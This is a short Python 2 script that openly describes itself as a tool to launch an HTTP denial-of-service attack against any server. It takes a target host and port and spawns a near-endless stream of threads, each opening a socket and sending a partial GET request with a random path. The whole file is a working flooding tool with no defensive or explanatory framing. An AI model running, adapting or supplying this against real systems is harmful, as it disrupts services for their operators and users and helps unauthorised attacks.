#!/usr/bin/env python
import socket
import sys
import random
import time
import string
import threading
import argparse
import logging

# setup logging
logging.basicConfig(stream=sys.stdout,level = logging.DEBUG)
logger = logging.getLogger(__name__)

attack_iterations = 100000000000

def cmd_arguments():

    try:
        parser = argparse.ArgumentParser("This script is used to launch Http DoS against any server. Use it at your own risks!")

        parser.add_argument('--host', help='Please specify configuration file',dest='host',default='127.0.0.1')
        parser.add_argument('--port', help='Please specify configuration file',dest='port',default=80)
        args = parser.parse_args()
        return args.host, args.port

    except Exception as exc:
        logger.error("Error while getting command line arguments - %s" %exc.message,exc_info=True)

def http_get_flood(ip, port):

    try:

        message_characters = str(string.letters + string.digits + string.punctuation)
        data = "".join(random.sample(message_characters,7))

        logger.info("Initializing the socket for %s" %ip)
        dos_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    

        try:

            dos_socket.connect((ip,port))
            dos_socket.send("GET /%s HTTP/1.1\r\n" %data) 

        except socket.error:
            logger.error("Could not establish connection. Server may be down!")

        dos_socket.close()
 
    except Exception as exc:
        logger.error("Error while generating http GET requests")


if __name__ == '__main__':
     
     host,port = cmd_arguments()
     host = str(host).replace("https://","").replace("http://","").replace("www","")
     ip = socket.gethostbyname(host)
     cnt =0  

     for i in xrange(attack_iterations):

          cnt += 1   

          thread_instance = threading.Thread(target=http_get_flood, args = (ip,int(port)))
          thread_instance.daemon =True # if thread is exist, it dies
          thread_instance.start()

          #http_get_flood(ip,int(port)) 

          if cnt == 1000:
              cnt =0
              time.sleep(0.01)
